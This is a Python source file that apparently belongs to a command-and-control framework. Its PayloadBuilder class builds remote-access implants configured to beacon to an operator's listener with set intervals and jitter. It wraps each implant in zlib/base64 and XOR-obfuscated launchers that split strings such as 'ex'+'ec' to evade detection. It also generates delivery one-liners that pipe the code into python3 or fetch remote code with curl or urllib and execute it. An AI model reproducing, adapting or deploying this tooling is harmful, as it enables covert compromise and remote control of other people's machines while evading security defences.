from __future__ import annotations

import base64
import hashlib
import json
import os
import secrets
import zlib
from pathlib import Path

from .code_delivery import CodeDeliveryPipeline
from .crypto import derive_key
from .file_store import new_id, now_iso

_DH_PRIME = int(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E08"
    "8A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B"
    "302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9"
    "A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE6"
    "49286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8"
    "FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C"
    "180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718"
    "3995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFF"
    "FFFFFFFF",
    16,
)
_DH_GENERATOR = 2


class PayloadError(Exception):
    pass


class PayloadBuilder:
    def __init__(self, runtime):
        self.runtime = runtime
        self.store = runtime.store
        self.pipeline: CodeDeliveryPipeline = runtime.pipeline

    def _template(self) -> str:
        root = Path(__file__).resolve().parent
        crypto_source = (root / "crypto.py").read_text(encoding="utf-8")
        runtime_source = (root / "implant_runtime.py").read_text(encoding="utf-8")
        return crypto_source + "\n\n" + runtime_source

    @staticmethod
    def _random_name() -> str:
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return "".join(secrets.choice(alphabet) for _ in range(8))

    @staticmethod
    def _normal_launcher(source: str) -> str:
        compressed = zlib.compress(source.encode("utf-8"), 9)
        b64 = base64.b64encode(compressed).decode()
        return 'import base64,zlib;exec(zlib.decompress(base64.b64decode("' + b64 + '")))'

    def _obfuscated_launcher(self, source: str) -> str:
        compressed = zlib.compress(source.encode("utf-8"), 9)
        key = secrets.token_bytes(32)
        encoded = base64.b64encode(bytes(value ^ key[index % len(key)] for index, value in enumerate(compressed))).decode()
        key_hex = key.hex()
        a, b, c, d, i = (self._random_name() for _ in range(5))
        # Keep all string literals double-quoted so the resulting launcher can be
        # embedded safely inside the original single-quoted echo delivery method.
        return (
            f'{a}=__import__("ba"+"se64",fromlist=["b64decode"]).b64decode;'
            f'{b}=__import__("zl"+"ib",fromlist=["decompress"]).decompress;'
            f'{c}=bytes.fromhex("{key_hex}");'
            f'{d}={a}("{encoded}");'
            f'getattr(__import__("buil"+"tins"),"ex"+"ec")({b}(bytes({d}[{i}]^{c}[{i}%len({c})] for {i} in range(len({d})))))'
        )

    @staticmethod
    def _with_variant(url: str, variant: str) -> str:
        separator = "&" if "?" in url else "?"
        return f"{url}{separator}variant={variant}"

    def _base_methods(self, normal_launcher: str, download_url: str) -> dict:
        return {
            # Direct echo stays first: it is the most portable delivery method.
            "direct_echo": "echo '" + normal_launcher + "' | python3",
            "short_downloader": self._short_loader(download_url, obfuscated=False),
            "curl": f'curl -fsSL "{download_url}" | python3',
        }

    def _method_command(self, record: dict, method: str, enabled: bool) -> str:
        source = str(record.get("_source") or "")
        normal_launcher = str(record.get("_normal_launcher") or self._normal_launcher(source))
        download_url = str(record.get("download_url") or "")
        if method == "direct_echo":
            if enabled:
                launcher = str(record.get("_direct_echo_launcher") or "")
                if not launcher:
                    launcher = self._obfuscated_launcher(source)
                    record["_direct_echo_launcher"] = launcher
            else:
                launcher = normal_launcher
            return "echo '" + launcher + "' | python3"
        if method == "short_downloader":
            if enabled:
                if not record.get("_obfuscated_launcher"):
                    record["_obfuscated_launcher"] = self._obfuscated_launcher(source)
                url = self._with_variant(download_url, "obfuscated")
                return self._short_loader(url, obfuscated=True)
            return self._short_loader(download_url, obfuscated=False)
        if method == "curl":
            if enabled:
                if not record.get("_obfuscated_launcher"):
                    record["_obfuscated_launcher"] = self._obfuscated_launcher(source)
                return f'curl -fsSL "{self._with_variant(download_url, "obfuscated")}" | python3'
            return f'curl -fsSL "{download_url}" | python3'
        raise PayloadError(f"unsupported delivery method: {method}")

    def generate(
        self,
        listener_id: str,
        name: str = "单阶段载荷",
        public_url: str | None = None,
        fast_interval: float = 5.0,
        slow_interval: float = 30.0,
        finish_delay: float = 5.0,
        jitter: float = 0.2,
        max_concurrent_tasks: int = 8,
        initial_interval: float | None = None,
    ) -> dict:
        listener = self.runtime.listeners.get(listener_id)
        if listener.get("status") != "listening" and listener.get("status") != "starting":
            # allow generating while starting, but not for failed/stopped
            if listener.get("status") in {"failed", "stopped"}:
                raise PayloadError(f"listener is {listener.get('status')}")
        payload_id = new_id("pl_")
        token = secrets.token_urlsafe(24)
        beacon_id = new_id("beacon_")
        dh_private = secrets.randbelow(_DH_PRIME - 3) + 2
        dh_server_public = pow(_DH_GENERATOR, dh_private, _DH_PRIME)
        bind_host = str(listener.get("host") or "")
        public_host = str(listener.get("public_host") or bind_host)
        loopbacks = {"127.0.0.1", "localhost", "::1"}
        if public_host in loopbacks and bind_host not in loopbacks | {"0.0.0.0", "::", ""}:
            public_host = bind_host
        port = int(listener["port"])
        protocol = listener["protocol"]
        fast_interval = max(1.0, min(float(fast_interval), 600.0))
        slow_interval = max(fast_interval, min(float(slow_interval), 3600.0))
        finish_delay = max(0.0, min(float(finish_delay), 300.0))
        jitter = max(0.0, min(float(jitter), 0.9))
        max_concurrent_tasks = max(1, min(int(max_concurrent_tasks), 64))
        initial_interval = float(initial_interval if initial_interval is not None else fast_interval)
        initial_interval = max(fast_interval, min(initial_interval, slow_interval))
        settings = {
            "fast_interval": fast_interval,
            "slow_interval": slow_interval,
            "finish_delay": finish_delay,
            "jitter": jitter,
            "max_concurrent_tasks": max_concurrent_tasks,
            "initial_interval": initial_interval,
        }
        config = {
            "protocol": protocol,
            "host": public_host,
            "port": port,
            "initial_protocol": protocol,
            "initial_host": public_host,
            "initial_port": port,
            "beacon_id": beacon_id,
            "payload_token": token,
            "dh_prime": str(_DH_PRIME),
            "dh_generator": _DH_GENERATOR,
            "dh_server_pub": str(dh_server_public),
            "replay_protection": True,
            "initial_interval": initial_interval,
            "finish_delay": finish_delay,
            "slow_interval": slow_interval,
            "fast_interval": fast_interval,
            "jitter": jitter,
            "max_concurrent_tasks": max_concurrent_tasks,
            "listener_id": listener_id,
        }
        if protocol == "https":
            cert_path = self.runtime.settings.config_dir / "server.crt"
            if cert_path.exists():
                config["tls_ca_pem"] = cert_path.read_text(encoding="utf-8")
        source = self._template().replace("__CONFIG_JSON__", repr(config))
        prepared = self.pipeline.prepare(source, "payload", ref=payload_id, filename=f"<payload:{payload_id}>")
        source = prepared.source
        public_base = (public_url or self.runtime.settings.base_url).rstrip("/")
        download_url = f"{public_base}/p/{token}"
        # The public download is a self-decoding compressed/base64 launcher,
        # not the raw implant source. Transport traffic remains AEAD-sealed.
        launcher = self._normal_launcher(source)
        methods = self._base_methods(launcher, download_url)
        record = {
            "id": payload_id,
            "name": name,
            "listener_id": listener_id,
            "protocol": protocol,
            "host": public_host,
            "port": port,
            "initial_protocol": protocol,
            "initial_host": public_host,
            "initial_port": port,
            "beacon_id": beacon_id,
            "token": token,
            "dh_prime": str(_DH_PRIME),
            "dh_generator": _DH_GENERATOR,
            "dh_server_pub": str(dh_server_public),
            "dh_private": str(dh_private),
            "replay_protection": True,
            "download_url": download_url,
            "created_at": now_iso(),
            "size": len(launcher.encode("utf-8")),
            "original_hash": prepared.original_hash,
            "stripped_hash": prepared.stripped_hash,
            "launcher_hash": hashlib.sha256(launcher.encode("utf-8")).hexdigest(),
            "removed_comment_tokens": prepared.removed_tokens,
            "obfuscated": False,
            "obfuscated_methods": {
                "direct_echo": False,
                "short_downloader": False,
                "curl": False,
            },
            "obfuscation_rounds": 0,
            "methods": methods,
            "obfuscated_download_url": self._with_variant(download_url, "obfuscated"),
            "downloads": 0,
            "settings": settings,
        }
        # Payload workshop is intentionally transient: the active payload is
        # kept in memory only and no payload history is written to disk.
        record["_source"] = source
        record["_normal_launcher"] = launcher
        record["_obfuscated_launcher"] = ""
        record["_direct_echo_launcher"] = ""
        self.runtime.active_payloads[token] = record
        self.runtime.payload_sources[payload_id] = launcher
        # This is runtime state for reconnecting beacons, not a payload
        # history list. It is stored outside the data directory and is never
        # exposed by the payload workshop.
        self._persist_active_payload(token, record, launcher)
        self.store.event("payload.created", {"payload_id": payload_id, "listener_id": listener_id, "beacon_id": beacon_id, "protocol": protocol})
        return self.public(record)

    def _persist_active_payload(self, token: str, record: dict, source: str) -> None:
        runtime_dir = getattr(self.runtime, "settings", None)
        runtime_dir = getattr(runtime_dir, "runtime_dir", None)
        if runtime_dir is None:
            return
        directory = Path(runtime_dir) / "active_payloads"
        directory.mkdir(parents=True, exist_ok=True)
        path = directory / f"{token}.json"
        tmp = path.with_suffix(".tmp")
        tmp.write_text(json.dumps({"record": record, "source": source}, ensure_ascii=False), encoding="utf-8")
        try:
            tmp.chmod(0o600)
        except OSError:
            pass
        tmp.replace(path)
        try:
            path.chmod(0o600)
        except OSError:
            pass

    def _short_loader(self, url: str, obfuscated: bool = False) -> str:
        if not obfuscated:
            encoded = base64.b64encode(url.encode("utf-8")).decode()
            code = (
                "import urllib.request as u,base64;"
                f'exec(u.urlopen(base64.b64decode("{encoded}").decode()).read())'
            )
            return "echo '" + code + "' | python3"
        url_hex = url.encode("utf-8").hex()
        a, b = self._random_name(), self._random_name()
        code = (
            f'{a}=bytes.fromhex("{url_hex}").decode();'
            f'{b}=__import__("urllib.re"+"quest",fromlist=["urlopen"]).urlopen({a}).read();'
            f'getattr(__import__("buil"+"tins"),"ex"+"ec")({b})'
        )
        return "echo '" + code + "' | python3"

    def obfuscate(self, payload_id: str, method: str = "direct_echo", enabled: bool = True) -> dict:
        record = None
        active_token = ""
        for token, candidate in self.runtime.active_payloads.items():
            if candidate.get("id") == payload_id:
                record, active_token = candidate, token
                break
        if not record:
            raise PayloadError("payload not found or expired")
        source = str(record.get("_source") or "")
        if not source:
            raise PayloadError("payload source unavailable")
        valid_methods = {"direct_echo", "short_downloader", "curl"}
        method = str(method or "").strip()
        if method not in valid_methods:
            raise PayloadError(f"unsupported delivery method: {method}")
        if not record.get("_normal_launcher"):
            record["_normal_launcher"] = self._normal_launcher(source)
        if not isinstance(record.get("obfuscated_methods"), dict):
            record["obfuscated_methods"] = {name: False for name in valid_methods}
        record["_source"] = source
        record["methods"] = dict(record.get("methods") or self._base_methods(record["_normal_launcher"], str(record.get("download_url") or "")))
        record["obfuscated_methods"][method] = bool(enabled)
        record["methods"][method] = self._method_command(record, method, bool(enabled))
        record["obfuscated"] = any(bool(value) for value in record["obfuscated_methods"].values())
        record["obfuscation_rounds"] = int(record.get("obfuscation_rounds", 0)) + (1 if enabled else 0)
        # The payload download variants are method-specific; normal download
        # remains the canonical source and obfuscated is served via ?variant=obfuscated.
        record["size"] = len(str(record["_normal_launcher"]).encode("utf-8"))
        record["launcher_hash"] = hashlib.sha256(str(record["_normal_launcher"]).encode("utf-8")).hexdigest()
        self.runtime.payload_sources[payload_id] = str(record["_normal_launcher"])
        self.runtime.active_payloads[active_token] = record
        self._persist_active_payload(active_token, record, str(record["_normal_launcher"]))
        self.store.event("payload.obfuscated" if enabled else "payload.deobfuscated", {
            "payload_id": payload_id,
            "method": method,
            "variant": "xor-zlib-base64",
            "rounds": record["obfuscation_rounds"],
        })
        return self.public(record)

    @staticmethod
    def public(record: dict) -> dict:
        return {k: v for k, v in record.items() if k != "key_b64" and not k.startswith("_")}
